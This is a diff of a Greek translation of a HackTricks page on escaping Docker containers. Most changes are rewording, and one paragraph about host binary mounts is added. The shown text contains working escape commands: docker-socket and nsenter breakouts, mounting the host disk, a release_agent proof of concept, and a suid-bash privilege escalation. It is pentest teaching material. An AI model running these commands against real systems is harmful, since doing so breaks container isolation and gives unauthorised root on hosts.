@@ -2,17 +2,17 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-## Αυτόματη Αρίθμηση & Διαφυγή
+## Automatic Enumeration & Escape
 
-- [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Μπορεί επίσης να **αριθμήσει τα κοντέινερ**
-- [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Αυτό το εργαλείο είναι αρκετά **χρήσιμο για να αριθμήσει το κοντέινερ στο οποίο βρίσκεστε και να προσπαθήσει να διαφύγει αυτόματα**
+- [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Μπορεί επίσης να **καταγράψει κοντέινερ**
+- [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Αυτό το εργαλείο είναι αρκετά **χρήσιμο για να καταγράψει το κοντέινερ στο οποίο βρίσκεστε και να προσπαθήσει να διαφύγει αυτόματα**
 - [**amicontained**](https://github.com/genuinetools/amicontained): Χρήσιμο εργαλείο για να αποκτήσετε τα δικαιώματα που έχει το κοντέινερ προκειμένου να βρείτε τρόπους να διαφύγετε από αυτό
-- [**deepce**](https://github.com/stealthcopter/deepce): Εργαλείο για να αριθμήσει και να διαφύγει από κοντέινερ
+- [**deepce**](https://github.com/stealthcopter/deepce): Εργαλείο για να καταγράψει και να διαφύγει από κοντέινερ
 - [**grype**](https://github.com/anchore/grype): Λάβετε τα CVEs που περιέχονται στο λογισμικό που είναι εγκατεστημένο στην εικόνα
 
-## Διαφυγή από το Εγκατεστημένο Docker Socket
+## Mounted Docker Socket Escape
 
-Αν με κάποιο τρόπο διαπιστώσετε ότι το **docker socket είναι εγκατεστημένο** μέσα στο κοντέινερ docker, θα μπορείτε να διαφύγετε από αυτό.\
+Αν με κάποιο τρόπο διαπιστώσετε ότι το **docker socket είναι τοποθετημένο** μέσα στο κοντέινερ docker, θα μπορείτε να διαφύγετε από αυτό.\
 Αυτό συμβαίνει συνήθως σε κοντέινερ docker που για κάποιο λόγο χρειάζονται να συνδεθούν με το docker daemon για να εκτελέσουν ενέργειες.
 ```bash
 #Search the socket
@@ -33,12 +33,12 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 # Get full privs in container without --privileged
 docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
 ```
-> [!NOTE]
-> Σε περίπτωση που το **docker socket είναι σε απροσδόκητη τοποθεσία**, μπορείτε να επικοινωνήσετε μαζί του χρησιμοποιώντας την εντολή **`docker`** με την παράμετρο **`-H unix:///path/to/docker.sock`**
+> [!TIP]
+> Σε περίπτωση που το **docker socket είναι σε αναπάντεχη τοποθεσία**, μπορείτε να επικοινωνήσετε μαζί του χρησιμοποιώντας την εντολή **`docker`** με την παράμετρο **`-H unix:///path/to/docker.sock`**
 
-Ο Docker daemon μπορεί επίσης να [ακούει σε μια θύρα (κατά προεπιλογή 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) ή σε συστήματα βασισμένα σε Systemd, η επικοινωνία με τον Docker daemon μπορεί να γίνει μέσω του socket του Systemd `fd://`.
+Ο Docker daemon μπορεί επίσης να [ακούει σε μια θύρα (κατά προεπιλογή 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) ή σε συστήματα βασισμένα σε Systemd, η επικοινωνία με τον Docker daemon μπορεί να συμβαίνει μέσω του socket Systemd `fd://`.
 
-> [!NOTE]
+> [!TIP]
 > Επιπλέον, δώστε προσοχή στα runtime sockets άλλων υψηλού επιπέδου runtimes:
 >
 > - dockershim: `unix:///var/run/dockershim.sock`
@@ -82,7 +82,7 @@ capsh --print
 ../docker-privileged.md
 {{#endref}}
 
-### Προνομιακό + hostPID
+### Privileged + hostPID
 
 Με αυτές τις άδειες μπορείτε απλά να **μετακινηθείτε στο namespace μιας διαδικασίας που εκτελείται στον host ως root** όπως το init (pid:1) απλά εκτελώντας: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
 
@@ -92,15 +92,15 @@ docker run --rm -it --pid=host --privileged ubuntu bash
 ```
 ### Privileged
 
-Μόνο με την σημαία privileged μπορείτε να προσπαθήσετε να **πρόσβαση στον δίσκο του host** ή να προσπαθήσετε να **ξεφύγετε εκμεταλλευόμενοι το release_agent ή άλλες διαφυγές**.
+Μόνο με την σημαία privileged μπορείτε να προσπαθήσετε να **πρόσβαση στον δίσκο του host** ή να προσπαθήσετε να **ξεφύγετε εκμεταλλευόμενοι το release_agent ή άλλες εκ escapes**.
 
-Δοκιμάστε τους παρακάτω παρακάμψεις σε ένα κοντέινερ εκτελώντας:
+Δοκιμάστε τις παρακάτω παρακάμψεις σε ένα κοντέινερ εκτελώντας:
 ```bash
 docker run --rm -it --privileged ubuntu bash
 ```
 #### Mounting Disk - Poc1
 
-Καλά ρυθμισμένα docker containers δεν θα επιτρέψουν εντολές όπως **fdisk -l**. Ωστόσο, σε κακώς ρυθμισμένη docker εντολή όπου η σημαία `--privileged` ή `--device=/dev/sda1` με κεφαλαία έχει καθοριστεί, είναι δυνατόν να αποκτηθούν τα δικαιώματα για να δει κανείς τον δίσκο του host.
+Καλά ρυθμισμένα docker containers δεν θα επιτρέψουν εντολές όπως **fdisk -l**. Ωστόσο, σε κακώς ρυθμισμένη docker εντολή όπου η σημαία `--privileged` ή `--device=/dev/sda1` με κεφαλαία έχει καθοριστεί, είναι δυνατό να αποκτήσετε τα δικαιώματα για να δείτε τον δίσκο του host.
 
 ![](https://bestestredteam.com/content/images/2019/08/image-16.png)
 
@@ -109,9 +109,9 @@ docker run --rm -it --privileged ubuntu bash
 mkdir -p /mnt/hola
 mount /dev/sda1 /mnt/hola
 ```
-Και voilà! Τώρα μπορείτε να έχετε πρόσβαση στο σύστημα αρχείων του host γιατί είναι τοποθετημένο στον φάκελο `/mnt/hola`.
+Και voilà! Μπορείτε τώρα να έχετε πρόσβαση στο σύστημα αρχείων του host γιατί είναι τοποθετημένο στον φάκελο `/mnt/hola`.
 
-#### Τοποθέτηση Δίσκου - Poc2
+#### Mounting Disk - Poc2
 
 Μέσα στο κοντέινερ, ένας επιτιθέμενος μπορεί να προσπαθήσει να αποκτήσει περαιτέρω πρόσβαση στο υποκείμενο λειτουργικό σύστημα του host μέσω ενός εγγράψιμου hostPath volume που έχει δημιουργηθεί από το cluster. Παρακάτω είναι μερικά κοινά πράγματα που μπορείτε να ελέγξετε μέσα στο κοντέινερ για να δείτε αν μπορείτε να εκμεταλλευτείτε αυτό το vector επιθέσεων:
 ```bash
@@ -134,7 +134,7 @@ mount: /mnt: permission denied. ---> Failed! but if not, you may have access to 
 ### debugfs (Interactive File System Debugger)
 debugfs /dev/sda1
 ```
-#### Privileged Escape Κατάχρηση υπάρχοντος release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
+#### Privileged Escape Abusing existent release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
 ```bash:Initial PoC
 # spawn a new container to exploit via:
 # docker run --rm -it --privileged ubuntu bash
@@ -282,7 +282,7 @@ sleep 1
 echo "Done! Output:"
 cat ${OUTPUT_PATH}
 ```
-Η εκτέλεση του PoC μέσα σε ένα προνομιούχο κοντέινερ θα πρέπει να παρέχει έξοδο παρόμοια με:
+Η εκτέλεση του PoC μέσα σε ένα προνομιακό κοντέινερ θα πρέπει να παρέχει έξοδο παρόμοια με:
 ```bash
 root@container:~$ ./release_agent_pid_brute.sh
 Checking pid 100
@@ -310,10 +310,10 @@ root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
 root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ...
 ```
-#### Εκμετάλλευση Προνομιακής Διαφυγής μέσω Ευαίσθητων Μοντάρων
+#### Privileged Escape Abusing Sensitive Mounts
 
-Υπάρχουν αρκετά αρχεία που μπορεί να είναι μονταρισμένα και να δίνουν **πληροφορίες για τον υποκείμενο host**. Ορισμένα από αυτά μπορεί ακόμη να υποδεικνύουν **κάτι που θα εκτελείται από τον host όταν συμβεί κάτι** (το οποίο θα επιτρέψει σε έναν επιτιθέμενο να διαφύγει από το κοντέινερ).\
-Η εκμετάλλευση αυτών των αρχείων μπορεί να επιτρέψει:
+Υπάρχουν αρκετά αρχεία που μπορεί να είναι προσαρτημένα και να δίνουν **πληροφορίες για τον υποκείμενο host**. Ορισμένα από αυτά μπορεί ακόμη να υποδεικνύουν **κάτι που θα εκτελείται από τον host όταν συμβεί κάτι** (το οποίο θα επιτρέψει σε έναν επιτιθέμενο να διαφύγει από το κοντέινερ).\
+Η κακή χρήση αυτών των αρχείων μπορεί να επιτρέψει:
 
 - release_agent (έχει καλυφθεί ήδη)
 - [binfmt_misc](sensitive-mounts.md#proc-sys-fs-binfmt_misc)
@@ -327,16 +327,18 @@ root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 sensitive-mounts.md
 {{#endref}}
 
-### Αυθαίρετα Μοντάρισμα
+### Arbitrary Mounts
 
-Σε πολλές περιπτώσεις θα διαπιστώσετε ότι το **κοντέινερ έχει κάποιον όγκο μονταρισμένο από τον host**. Εάν αυτός ο όγκος δεν έχει ρυθμιστεί σωστά, μπορεί να είστε σε θέση να **πρόσβαση/τροποποιήσετε ευαίσθητα δεδομένα**: Διαβάστε μυστικά, αλλάξτε ssh authorized_keys…
+Σε πολλές περιπτώσεις θα διαπιστώσετε ότι το **κοντέινερ έχει κάποιον όγκο προσαρτημένο από τον host**. Εάν αυτός ο όγκος δεν έχει ρυθμιστεί σωστά, μπορεί να είστε σε θέση να **πρόσβαση/τροποποιήσετε ευαίσθητα δεδομένα**: Διαβάστε μυστικά, αλλάξτε ssh authorized_keys…
 ```bash
 docker run --rm -it -v /:/host ubuntu bash
 ```
+Ένα άλλο ενδιαφέρον παράδειγμα μπορεί να βρεθεί σε [**αυτό το blog**](https://projectdiscovery.io/blog/versa-concerto-authentication-bypass-rce) όπου αναφέρεται ότι οι φάκελοι `/usr/bin/` και `/bin/` του host είναι τοποθετημένοι μέσα στο κοντέινερ, επιτρέποντας στον χρήστη root του κοντέινερ να τροποποιεί τα δυαδικά αρχεία μέσα σε αυτούς τους φακέλους. Επομένως, αν μια εργασία cron χρησιμοποιεί οποιοδήποτε δυαδικό από εκεί, όπως το `/etc/cron.d/popularity-contest`, αυτό επιτρέπει την έξοδο από το κοντέινερ τροποποιώντας ένα δυαδικό που χρησιμοποιείται από την εργασία cron.
+
 ### Privilege Escalation with 2 shells and host mount
 
-Αν έχετε πρόσβαση ως **root μέσα σε ένα κοντέινερ** που έχει κάποιον φάκελο από τον host τοποθετημένο και έχετε **διαφύγει ως μη προνομιούχος χρήστης στον host** και έχετε δικαιώματα ανάγνωσης πάνω από τον τοποθετημένο φάκελο.\
-Μπορείτε να δημιουργήσετε ένα **bash suid αρχείο** στον **τοποθετημένο φάκελο** μέσα στο **κοντέινερ** και να **το εκτελέσετε από τον host** για privesc.
+Αν έχετε πρόσβαση ως **root μέσα σε ένα κοντέινερ** που έχει κάποιον φάκελο από τον host τοποθετημένο και έχετε **ξεφύγει ως μη προνομιούχος χρήστης στον host** και έχετε δικαιώματα ανάγνωσης πάνω στον τοποθετημένο φάκελο.\
+Μπορείτε να δημιουργήσετε ένα **bash suid file** στον **τοποθετημένο φάκελο** μέσα στο **κοντέινερ** και να **το εκτελέσετε από τον host** για privesc.
 ```bash
 cp /bin/bash . #From non priv inside mounted folder
 # You need to copy it from the host as the bash binaries might be diferent in the host and in the container
@@ -351,7 +353,7 @@ bash -p #From non priv inside mounted folder
 
 Το Docker προστατεύει από την κακή χρήση των αρχείων συσκευών μπλοκ μέσα σε containers επιβάλλοντας μια πολιτική cgroup που **μπλοκάρει τις λειτουργίες ανάγνωσης/εγγραφής αρχείων συσκευών μπλοκ**. Παρ' όλα αυτά, αν ένα αρχείο συσκευής μπλοκ **δημιουργηθεί μέσα στο container**, γίνεται προσβάσιμο από έξω από το container μέσω του **/proc/PID/root/** καταλόγου. Αυτή η πρόσβαση απαιτεί ο **ιδιοκτήτης της διαδικασίας να είναι ο ίδιος** τόσο μέσα όσο και έξω από το container.
 
-**Exploitation** παράδειγμα από αυτή την [**writeup**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
+**Exploitation** παράδειγμα από αυτή την [**ανάρτηση**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
 ```bash
 # On the container as root
 cd /
@@ -417,35 +419,35 @@ cat /proc/635813/fd/4
 Μπορείτε επίσης να **τερματίσετε διεργασίες και να προκαλέσετε DoS**.
 
 > [!WARNING]
-> Εάν έχετε κάπως προνομιακή **πρόσβαση σε μια διεργασία εκτός του κοντέινερ**, θα μπορούσατε να εκτελέσετε κάτι όπως `nsenter --target <pid> --all` ή `nsenter --target <pid> --mount --net --pid --cgroup` για να **εκτελέσετε ένα shell με τους ίδιους περιορισμούς ns** (ελπίζουμε κανέναν) **όπως αυτή η διεργασία.**
+> Εάν έχετε με κάποιο τρόπο προνομιακή **πρόσβαση σε μια διεργασία εκτός του κοντέινερ**, θα μπορούσατε να εκτελέσετε κάτι όπως `nsenter --target <pid> --all` ή `nsenter --target <pid> --mount --net --pid --cgroup` για να **εκτελέσετε ένα shell με τους ίδιους περιορισμούς ns** (ελπίζουμε κανέναν) **όπως αυτή η διεργασία.**
 
 ### hostNetwork
 ```
 docker run --rm -it --network=host ubuntu bash
 ```
-Αν ένα κοντέινερ έχει ρυθμιστεί με τον Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/), το δίκτυο του κοντέινερ δεν είναι απομονωμένο από τον Docker host (το κοντέινερ μοιράζεται το namespace δικτύου του host) και το κοντέινερ δεν αποκτά τη δική του διεύθυνση IP. Με άλλα λόγια, το **κοντέινερ δένει όλες τις υπηρεσίες απευθείας στη διεύθυνση IP του host**. Επιπλέον, το κοντέινερ μπορεί να **παρακολουθεί ΟΛΗ την κυκλοφορία δικτύου που στέλνει και λαμβάνει ο host** στην κοινή διεπαφή `tcpdump -i eth0`.
+Αν ένα κοντέινερ έχει ρυθμιστεί με τον Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/), το δίκτυο του κοντέινερ δεν είναι απομονωμένο από τον Docker host (το κοντέινερ μοιράζεται το namespace δικτύωσης του host), και το κοντέινερ δεν αποκτά τη δική του διεύθυνση IP. Με άλλα λόγια, το **κοντέινερ δένει όλες τις υπηρεσίες απευθείας στη διεύθυνση IP του host**. Επιπλέον, το κοντέινερ μπορεί να **παρακολουθεί ΟΛΗ την δικτυακή κίνηση που στέλνει και λαμβάνει ο host** στην κοινή διεπαφή `tcpdump -i eth0`.
 
-Για παράδειγμα, μπορείτε να το χρησιμοποιήσετε για να **παρακολουθήσετε και ακόμη και να παραποιήσετε την κυκλοφορία** μεταξύ του host και της μεταδεδομένης παρουσίας.
+Για παράδειγμα, μπορείτε να το χρησιμοποιήσετε για να **παρακολουθήσετε και ακόμη και να παραποιήσετε την κίνηση** μεταξύ του host και της μεταδεδομένης παρουσίας.
 
 Όπως στα παρακάτω παραδείγματα:
 
 - [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
 - [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata_MITM_root_EKS_GKE/)
 
-Θα μπορείτε επίσης να έχετε πρόσβαση σε **υπηρεσίες δικτύου που είναι δεμένες με το localhost** μέσα στον host ή ακόμη και να έχετε πρόσβαση στις **άδειες μεταδεδομένων του κόμβου** (οι οποίες μπορεί να είναι διαφορετικές από αυτές που μπορεί να έχει πρόσβαση ένα κοντέινερ).
+Θα μπορείτε επίσης να έχετε πρόσβαση σε **υπηρεσίες δικτύου που δένονται στο localhost** μέσα στον host ή ακόμη και να έχετε πρόσβαση στις **άδειες μεταδεδομένων του κόμβου** (οι οποίες μπορεί να είναι διαφορετικές από αυτές που μπορεί να έχει πρόσβαση ένα κοντέινερ).
 
 ### hostIPC
 ```bash
 docker run --rm -it --ipc=host ubuntu bash
 ```
-Με το `hostIPC=true`, αποκτάτε πρόσβαση στους πόρους επικοινωνίας διεργασιών (IPC) του κεντρικού υπολογιστή, όπως η **κοινή μνήμη** στο `/dev/shm`. Αυτό επιτρέπει την ανάγνωση/εγγραφή όπου οι ίδιοι πόροι IPC χρησιμοποιούνται από άλλες διεργασίες του κεντρικού υπολογιστή ή του pod. Χρησιμοποιήστε το `ipcs` για να εξετάσετε περαιτέρω αυτούς τους μηχανισμούς IPC.
+Με το `hostIPC=true`, αποκτάτε πρόσβαση στους πόρους επικοινωνίας διεργασιών (IPC) του host, όπως η **κοινή μνήμη** στο `/dev/shm`. Αυτό επιτρέπει την ανάγνωση/εγγραφή όπου οι ίδιοι πόροι IPC χρησιμοποιούνται από άλλες διεργασίες host ή pod. Χρησιμοποιήστε το `ipcs` για να εξετάσετε περαιτέρω αυτούς τους μηχανισμούς IPC.
 
 - **Εξετάστε το /dev/shm** - Αναζητήστε οποιαδήποτε αρχεία σε αυτήν την τοποθεσία κοινής μνήμης: `ls -la /dev/shm`
 - **Εξετάστε τις υπάρχουσες εγκαταστάσεις IPC** – Μπορείτε να ελέγξετε αν χρησιμοποιούνται κάποιες εγκαταστάσεις IPC με το `/usr/bin/ipcs`. Ελέγξτε το με: `ipcs -a`
 
-### Ανάκτηση ικανοτήτων
+### Ανάκτηση δυνατοτήτων
 
-Εάν η syscall **`unshare`** δεν απαγορεύεται, μπορείτε να ανακτήσετε όλες τις ικανότητες εκτελώντας:
+Εάν η syscall **`unshare`** δεν απαγορεύεται, μπορείτε να ανακτήσετε όλες τις δυνατότητες εκτελώντας:
 ```bash
 unshare -UrmCpf bash
 # Check them with
@@ -459,7 +461,7 @@ cat /proc/self/status | grep CapEff
 
 ### Runc exploit (CVE-2019-5736)
 
-Σε περίπτωση που μπορείτε να εκτελέσετε `docker exec` ως root (πιθανώς με sudo), προσπαθείτε να κλιμακώσετε τα δικαιώματα σας διαφεύγοντας από ένα container καταχρώντας το CVE-2019-5736 (exploit [εδώ](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Αυτή η τεχνική θα **επικαλύψει** το _**/bin/sh**_ δυαδικό αρχείο του **host** **από ένα container**, έτσι ώστε οποιοσδήποτε εκτελεί docker exec να μπορεί να ενεργοποιήσει το payload.
+Σε περίπτωση που μπορείτε να εκτελέσετε `docker exec` ως root (πιθανώς με sudo), προσπαθείτε να κλιμακώσετε τα δικαιώματα σας ξεφεύγοντας από ένα container καταχρώντας το CVE-2019-5736 (exploit [εδώ](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Αυτή η τεχνική θα **επικαλύψει** το _**/bin/sh**_ δυαδικό αρχείο του **host** **από ένα container**, έτσι ώστε οποιοσδήποτε εκτελεί docker exec να μπορεί να ενεργοποιήσει το payload.
 
 Αλλάξτε το payload αναλόγως και κατασκευάστε το main.go με `go build main.go`. Το προκύπτον δυαδικό αρχείο θα πρέπει να τοποθετηθεί στο docker container για εκτέλεση.\
 Κατά την εκτέλεση, μόλις εμφανιστεί το `[+] Overwritten /bin/sh successfully` πρέπει να εκτελέσετε το εξής από τη μηχανή host:
@@ -470,17 +472,17 @@ cat /proc/self/status | grep CapEff
 
 Για περισσότερες πληροφορίες: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
 
-> [!NOTE]
+> [!TIP]
 > Υπάρχουν άλλες CVEs στις οποίες το container μπορεί να είναι ευάλωτο, μπορείτε να βρείτε μια λίστα στο [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
 
 ## Docker Custom Escape
 
 ### Επιφάνεια Διαφυγής Docker
 
-- **Namespaces:** Η διαδικασία θα πρέπει να είναι **εντελώς απομονωμένη από άλλες διαδικασίες** μέσω namespaces, έτσι ώστε να μην μπορούμε να διαφύγουμε αλληλεπιδρώντας με άλλες διαδικασίες λόγω namespaces (κατά προεπιλογή δεν μπορούν να επικοινωνούν μέσω IPCs, unix sockets, δικτυακών υπηρεσιών, D-Bus, `/proc` άλλων διαδικασιών).
-- **Χρήστης root**: Κατά προεπιλογή, ο χρήστης που εκτελεί τη διαδικασία είναι ο χρήστης root (ωστόσο τα δικαιώματά του είναι περιορισμένα).
-- **Δυνατότητες**: Το Docker αφήνει τις εξής δυνατότητες: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
-- **Syscalls**: Αυτές είναι οι syscalls που ο **χρήστης root δεν θα μπορεί να καλέσει** (λόγω έλλειψης δυνατοτήτων + Seccomp). Οι άλλες syscalls θα μπορούσαν να χρησιμοποιηθούν για να προσπαθήσουν να διαφύγουν.
+- **Namespaces:** Η διαδικασία θα πρέπει να είναι **εντελώς απομονωμένη από άλλες διαδικασίες** μέσω namespaces, έτσι ώστε να μην μπορούμε να ξεφύγουμε αλληλεπιδρώντας με άλλες διαδικασίες λόγω namespaces (κατά προεπιλογή δεν μπορούν να επικοινωνούν μέσω IPCs, unix sockets, δικτυακών υπηρεσιών, D-Bus, `/proc` άλλων διαδικασιών).
+- **Root user**: Κατά προεπιλογή, ο χρήστης που εκτελεί τη διαδικασία είναι ο root user (ωστόσο τα δικαιώματά του είναι περιορισμένα).
+- **Capabilities**: Το Docker αφήνει τις εξής δυνατότητες: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
+- **Syscalls**: Αυτές είναι οι syscalls που ο **root user δεν θα μπορεί να καλέσει** (λόγω έλλειψης δυνατοτήτων + Seccomp). Οι άλλες syscalls θα μπορούσαν να χρησιμοποιηθούν για να προσπαθήσουν να ξεφύγουν.
 
 {{#tabs}}
 {{#tab name="x64 syscalls"}}
